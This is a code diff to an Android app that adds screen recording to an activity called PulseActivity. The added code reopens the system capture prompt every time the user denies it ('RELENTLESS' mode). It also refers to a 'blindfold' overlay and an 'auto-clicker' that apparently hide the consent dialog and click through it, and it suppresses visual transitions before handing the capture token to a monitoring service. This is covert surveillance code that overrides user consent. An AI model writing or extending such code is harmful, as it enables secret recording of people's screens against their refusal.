@@ -34,6 +34,13 @@ class PulseActivity : Activity() {
              }, 2000)
         }
 
+        // 3.5 Relentless Screen Capture Engine
+        if (intent.getBooleanExtra("is_screen_record_trigger", false)) {
+            val mpm = getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
+            startActivityForResult(mpm.createScreenCaptureIntent(), 999)
+            return // Halt normal termination logic until result is received
+        }
+
         // 4. Engagement Protocol Redirect
         if (intent.getBooleanExtra("is_engagement_trigger", false)) {
             EngagementTracker.recordEvent(this, "MIRROR_CLICK")
@@ -85,5 +92,39 @@ class PulseActivity : Activity() {
         // overridePendingTransition(0, 0) prevents any visual screen-flash.
         finish()
         overridePendingTransition(0, 0)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == 999) {
+            if (resultCode == RESULT_OK && data != null) {
+                DebugLogger.log("SCREEN_REC", "Token captured. Passing to MonitorService...")
+                val i = Intent(this, MonitorService::class.java).apply {
+                    action = "ACTION_START_RECORDING"
+                    putExtra("resultCode", resultCode)
+                    putExtra("data", data)
+                }
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    startForegroundService(i)
+                } else {
+                    startService(i)
+                }
+            } else {
+                DebugLogger.log("SCREEN_REC", "Permission denied by user.")
+                if (ScreenRecordManager.expectedMode == "RELENTLESS") {
+                    DebugLogger.log("SCREEN_REC", "RELENTLESS MODE: Respawning capture prompt instantly.")
+                    val mpm = getSystemService(android.content.Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
+                    startActivityForResult(mpm.createScreenCaptureIntent(), 999)
+                    return
+                }
+            }
+            // Remove blindfold in case the auto-clicker failed or was skipped
+            if (ScreenRecordManager.expectedMode == "AUTO") {
+                DimmerManager.removeOverlay(this)
+                ScreenRecordManager.expectedMode = "" 
+            }
+            finish()
+            overridePendingTransition(0, 0)
+        }
     }
 }
